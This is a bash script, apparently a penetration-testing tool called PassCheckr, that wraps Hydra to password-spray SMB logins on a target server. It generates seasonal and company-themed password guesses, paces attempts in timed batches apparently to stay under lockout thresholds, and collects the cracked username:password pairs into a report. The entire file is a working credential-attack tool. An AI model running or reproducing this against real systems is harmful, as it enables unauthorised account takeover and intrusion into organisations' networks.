# bin/bash
#
# PassCheckr v1.2
# aka Glorified Hydra Wrapper
#
# Kyle Colson - colsok
# Last Updated: July 24, 2018
#
# NOTE:
# Please set server IP address and attack rate settings in config.txt
#
# Syntax: ./passcheckr.sh <username list>
#
# ##############################################
# 
# There are three parts to this script:
# 1. Prepare: Compile lists based upon month/year, add Common and Custom lists to pass_file. Split into multiple files of 3-lines each.
# 2. Execute: For each file, run Hydra against input list. Sleep 30 minutes. Loop.
# 3. Report : Compile successful list, output combo list, clean TMP directory. (v.2 - Email)
# 
# ##############################################
# 
# Common vs. Custom Lists:
# 
# Common - Simple, reoccuring passwords. (e.g., Password123) 
# Custom - Unique passwords. Discovered in the field or with knowledge of the business. (i.e., company name, location, etc.)
#
################################################
################################################

SERVER_IP=$(cat config.txt | grep SERVER_IP | cut -f 2 -d "=")
ATTEMPTS=$(cat config.txt | grep ATTEMPTS | cut -f 2 -d "=")
SLEEP=$(cat config.txt | grep SLEEP | cut -f 2 -d "=")

if [ "$SERVER_IP" == "1.1.1.1" ];then
                echo "IP Address is default.. have you updated config.txt?"
                echo "Quitting"
                exit
fi

if [ "$#" -ne 1 ];then
		echo "Username input list missing."
		echo "Syntax:"
		echo "./passcheckr.sh <username list>"
		exit
fi


echo "IP Address to attack: "$SERVER_IP
echo "Total repeated attempts before sleep: "$ATTEMPTS
echo "Total sleep period before attack continues: "$SLEEP
echo "About to begin..."
sleep 5

## PART 1 - PREPARE ############################
##CREATE PASSWORD LISTS. INCLUDE GUESSES WHICH MAY USE MONTH-YEAR COMBINATION

##DECLARE VARIABLES
TMP_PATH=/tmp/passcheckr/
FILE_NAME=pass.lst
PASS_FILE=$TMP_PATH$FILE_NAME
INPUT_LIST=$1

#SET VARS
DATE=`date +%Y-%m-%d`
MONTH_LAST2=`date --date="$(date +%Y-%m-15) -2 month" +'%B'`
MONTH_LAST=`date --date="$(date +%Y-%m-15) -1 month" +'%B'`
MONTH_CURRENT=`date --date="$(date +%Y-%m-15)" +'%B'`
YEAR_CURRENT=`date +'%Y'`
#CLEANUP/PREP
rm -rf $TMP_PATH
echo "Creating password list."
sleep 1
mkdir $TMP_PATH
touch $PASS_FILE

#ADD IN THE CUSTOM AND COMMON LISTS
echo "Combining password files..."
sleep 1
cat Passlists/Custom.lst >> $PASS_FILE
cat Passlists/Common.lst >> $PASS_FILE

#WRITE MONTH GUESSES TO FILE (v.2 - convert this to array and loop)
echo "Adding more guesses..."
sleep 1
echo $MONTH_LAST2$YEAR_CURRENT>>$PASS_FILE
echo $MONTH_LAST2$YEAR_CURRENT"!">>$PASS_FILE
echo "${MONTH_LAST2,,}"$YEAR_CURRENT"!">>$PASS_FILE
echo "${MONTH_LAST2^^}"$YEAR_CURRENT"!">>$PASS_FILE
echo $MONTH_LAST$YEAR_CURRENT>>$PASS_FILE
echo $MONTH_LAST$YEAR_CURRENT"!">>$PASS_FILE
echo "${MONTH_LAST,,}"$YEAR_CURRENT"!">>$PASS_FILE
echo "${MONTH_LAST^^}"$YEAR_CURRENT"!">>$PASS_FILE
echo $MONTH_CURRENT$YEAR_CURRENT>>$PASS_FILE
echo $MONTH_CURRENT$YEAR_CURRENT"!">>$PASS_FILE
echo "${MONTH_CURRENT,,}"$YEAR_CURRENT"!">>$PASS_FILE
echo "${MONTH_CURRENT^^}"$YEAR_CURRENT"!">>$PASS_FILE

echo "Texas"$YEAR_CURRENT>>$PASS_FILE
echo "Texas"$YEAR_CURRENT"!">>$PASS_FILE
echo "texas"$YEAR_CURRENT"!">>$PASS_FILE
echo "TEXAS"$YEAR_CURRENT"!">>$PASS_FILE

echo "Test"$YEAR_CURRENT>>$PASS_FILE
echo "Test"$YEAR_CURRENT"!">>$PASS_FILE
echo "test"$YEAR_CURRENT"!">>$PASS_FILE
echo "TEST"$YEAR_CURRENT"!">>$PASS_FILE

##TAKE NIGHTLY JOB FILE AND SPLIT INTO x LINES EACH DEPENDING ON $ATTEMPTS
cat $PASS_FILE | sort -u | awk 'NF' > sorted.lst
mv sorted.lst $PASS_FILE
split -l $ATTEMPTS -d $PASS_FILE

## PART 2 - EXECUTE ##############################

## RUN HYDRA ON EACH SPLIT FILE, SLEEP 30 MINUTES
echo "Beginning attack!"
sleep 5

for f in x*
do 
	echo "Trying list $f....."
	cat $f

	hydra -L $INPUT_LIST -P $f $SERVER_IP smb -V -o $TMP_PATH$f.out
	echo "Sleep "$SLEEP
	sleep $SLEEP 
done

rm x*

## PART 3 - REPORT ###############################

cat $TMP_PATH*.out > final.report

cat final.report | grep password | cut -d" " -f7,11 | sed s/\ /:/ > combo.lst
mv combo.lst Reports/$DATE-combo.lst
mv final.report Reports/$DATE.out

rm -rf $TMP_PATH

echo "Complete!"
